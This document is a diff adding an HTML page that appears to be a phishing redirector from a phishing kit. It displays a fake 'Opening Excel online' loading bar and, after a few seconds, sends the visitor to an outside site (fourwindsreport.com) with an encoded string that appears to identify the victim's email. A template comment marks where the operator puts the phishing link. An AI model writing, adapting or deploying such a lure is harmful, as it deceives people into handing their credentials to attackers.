@@ -1,0 +1,171 @@
+<!-- URL =http://pesttechllc.com/rd/rd/9904f28d9384a095bce6d85776ddfb4e?usq=aglyb29ub0boas1oby5uzs5qca==--><!-- w =(['PESTTECHLLC.COM', 'pesttechllc.com'], [datetime.datetime(2018, 10, 9, 16, 42, 49), datetime.datetime(2018, 10, 9, 11, 42, 49)], [datetime.datetime(2023, 10, 9, 16, 42, 49), datetime.datetime(2023, 10, 9, 11, 42, 49)])--><!DOCTYPE doctype>
+<html>
+ <head>
+  <title>
+   Checking your Access!
+  </title>
+  <script crossorigin="anonymous" integrity="sha256-3edrmyuQ0w65f8gfBsqowzjJe2iM6n0nKciPUp8y+7E=" src="https://code.jquery.com/jquery-3.3.1.slim.min.js">
+  </script>
+  <style>
+   body
+			{
+				background : #fff;
+				font-family : tahoma;
+			}
+			
+			#main
+			{
+				width : 50%;
+				margin-left : auto;
+				margin-right : auto;
+				margin-top : 20%;
+				background : #fff;
+				text-align : center;
+			}
+			
+			#main_hd
+			{
+				
+			}
+			
+			#main_laoding_div
+			{
+				clear : both;
+			}
+			
+			#main_loading_full
+			{
+				background : #2af;
+				background : #eee;
+				width : 80%;
+				height : 1.2em;
+				padding : 0.4em;
+				margin-left : auto;
+				margin-right : auto;
+				margin-top : 2%;
+				border-radius : 3px;
+				box-shadow : inset 0px 0px 10px #555;
+			}
+			
+			#main_loading_working
+			{
+				width : 10%;
+				height : 95%;
+				background : #2f9;
+				background : linear-gradient(#0d8, #2f9, #0f9, #2e9, #0d8);
+				background : linear-gradient(#38b, #26a, #239, #017);
+				border-top-right-radius : 5px;
+				border-bottom-right-radius : 5px;
+				
+			}
+			
+			#main_loading_couting
+			{
+				font-size : 1.3em;
+			}
+			
+			#bottom_main
+			{
+				width : 98%;
+				position : absolute; 
+				bottom : 0.5em;
+			}
+				#bm_text
+				{
+					float : right;
+					width : 40%;
+					background : #fff;
+					box-shadow : -1px -1px 5px #eee;
+					text-align : right;
+					font-size : 0.8em;
+					font-weight :  bold;
+					color : #666;
+				}
+  </style>
+ </head>
+ <body>
+  <div id="main">
+   <div id="main_hd">
+    <h5>
+     Opening Excel online... Please wait.
+    </h5>
+   </div>
+   <div id="main_laoding_div">
+    <div id="main_loading_full">
+     <div id="main_loading_working">
+     </div>
+    </div>
+    <div id="main_loading_couting">
+     10%
+    </div>
+    <input hidden="" id="counter" type="number" value="10"/>
+   </div>
+  </div>
+  <script>
+   //couting. . . 
+			$("#counter").hide();
+	
+	function loader()
+	{
+		$valu = $("#counter").val();
+		// alert($valu);
+		if($valu == "10")
+		{
+			 $("#main_loading_couting").text("30%");
+			 $("#counter").val("30");
+			$("#main_loading_working").css("width", "30%");
+		}
+		else if($valu == "30")
+		{
+			 $("#main_loading_couting").text("55%");
+			 $("#counter").val("55");
+			$("#main_loading_working").css("width", "55%");
+		}
+		else if($valu == "55")
+		{
+			 $("#main_loading_couting").text("60%");
+			 $("#counter").val("60");
+			$("#main_loading_working").css("width", "60%");
+		}
+		else if($valu == "60")
+		{
+			 $("#main_loading_couting").text("87%");
+			 $("#counter").val("87");
+			$("#main_loading_working").css("width", "87%");
+		}
+		else if($valu == "87")
+		{
+			 $("#main_loading_couting").text("90%");
+			 $("#counter").val("90");
+			$("#main_loading_working").css("width", "90%");
+		}
+		else if($valu == "90")
+		{
+			 $("#main_loading_couting").text("100%");
+			 $("#counter").val("100");
+			$("#main_loading_working").css("width", "100%");
+			$email2 = "aglyb29ub0boas1oby5uzs5qca==";
+			
+			
+			//PUT YOUR LINK HERE
+			window.location = "https://fourwindsreport.com/ex/Excel/?ehdgk=" + $email2 + "&isfgsValidate=c";
+		} 
+		else
+		{
+			// $("#main_loading_couting").text("10%");
+			 // $("#counter").val("10");
+			// $("#main_loading_working").css("width", "10%");
+		}
+	}	
+	
+	setInterval(
+		function()
+		{
+			loader();
+		} ,1000
+		);
+  </script>
+ </body>
+ <html>
+ </html>
+</html>
